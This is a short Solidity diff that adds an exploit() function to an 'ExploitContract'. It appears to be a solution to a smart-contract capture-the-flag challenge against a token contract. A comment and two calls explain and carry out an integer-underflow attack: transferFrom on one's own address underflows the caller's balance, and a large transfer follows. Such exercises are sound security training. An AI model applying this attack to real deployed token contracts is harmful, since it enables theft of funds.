@@ -70,4 +70,11 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    /// @dev _transfer decrements the balance of msg.sender so if you call
+    /// transferFrom for someone else, you can underflow your balance
+    /// and get a large balance.
+    function exploit() public {
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1000);
+        tokenWhale.transfer(address(msg.sender), 1_000_000);
+    }
 }
